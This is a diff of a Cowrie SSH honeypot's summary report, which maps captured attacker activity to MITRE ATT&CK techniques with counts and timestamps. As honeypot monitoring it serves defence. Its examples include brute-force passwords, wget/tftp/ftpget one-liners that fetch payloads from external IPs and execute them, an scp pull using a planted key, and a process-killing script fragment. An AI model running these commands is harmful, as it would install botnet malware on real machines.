@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-15 08:00:20",
+  "generated": "2026-09-15 09:03:45",
   "totals": {
-    "commands": 709,
-    "login_failed": 1233,
-    "login_success": 219,
-    "sessions": 1391
+    "commands": 792,
+    "login_failed": 2404,
+    "login_success": 232,
+    "sessions": 2571
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1233,
+      "count": 2404,
       "examples": [
         "root / 12345678",
         "root / 123456789",
@@ -21,14 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-09-15T00:01:09.372940Z",
-      "last": "2026-09-15T08:00:18.551877Z",
-      "unique_ips": 47
+      "last": "2026-09-15T09:03:41.778953Z",
+      "unique_ips": 52
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 219,
+      "count": 232,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123456",
@@ -37,20 +37,21 @@
         "root / root123"
       ],
       "first": "2026-09-15T00:08:25.379657Z",
-      "last": "2026-09-15T07:59:16.591917Z",
-      "unique_ips": 30
+      "last": "2026-09-15T08:56:45.655114Z",
+      "unique_ips": 34
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 176,
+      "count": 186,
       "examples": [
-        "ls /home; /bin/busybox BOTNET"
+        "ls /home; /bin/busybox BOTNET",
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
       ],
       "first": "2026-09-15T01:59:58.939321Z",
-      "last": "2026-09-15T02:02:52.953267Z",
-      "unique_ips": 1
+      "last": "2026-09-15T08:52:35.483436Z",
+      "unique_ips": 2
     },
     {
       "id": "T1222.002",
@@ -72,30 +73,56 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 10,
+      "count": 24,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+        "wget http://102.220.160.204/wget.sh -O- | sh;tftp -g102.220.160.204 -r tftp.sh -l- | sh;/bin/busybox wget http://102.220"
       ],
       "first": "2026-09-15T01:24:06.981771Z",
-      "last": "2026-09-15T06:33:58.924372Z",
-      "unique_ips": 4
+      "last": "2026-09-15T08:52:48.609403Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 10,
+      "examples": [
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
+      ],
+      "first": "2026-09-15T08:52:31.972190Z",
+      "last": "2026-09-15T08:52:35.483436Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 10,
+      "examples": [
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
+      ],
+      "first": "2026-09-15T08:52:31.972190Z",
+      "last": "2026-09-15T08:52:35.483436Z",
+      "unique_ips": 1
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 9,
       "examples": [
         "uname -s -m",
         "uname -s -v -n -r -m",
-        "uname -a"
+        "uname -a",
+        "/bin/./uname -s -v -n -r -m"
       ],
       "first": "2026-09-15T00:47:30.338036Z",
-      "last": "2026-09-15T07:52:05.781011Z",
-      "unique_ips": 5
+      "last": "2026-09-15T08:06:03.076469Z",
+      "unique_ips": 7
     },
     {
       "id": "T1033",
@@ -126,35 +153,43 @@
   "unmapped": [
     [
       "sh",
-      196
+      204
     ],
     [
       "system",
-      195
+      203
+    ],
+    [
+      "shell",
+      27
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       24
     ],
     [
-      "shell",
-      19
+      "/bin/busybox UNSTABLE",
+      22
     ],
     [
-      "/bin/busybox UNSTABLE",
-      15
+      "sh 0",
+      10
+    ],
+    [
+      "/bin/busybox",
+      6
+    ],
+    [
+      "enable",
+      5
     ],
     [
       "cd /proc && cat self/cmdline",
       5
     ],
     [
-      "enable",
-      4
-    ],
-    [
       "linuxshell",
-      3
+      4
     ],
     [
       "enablelinuxshell",
@@ -165,7 +200,7 @@
       3
     ],
     [
-      "/bin/busybox",
+      "!v54!",
       2
     ],
     [
@@ -194,14 +229,6 @@
     ],
     [
       "AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9",
-      1
-    ],
-    [
-      "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=",
-      1
-    ],
-    [
-      "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
       1
     ]
   ]
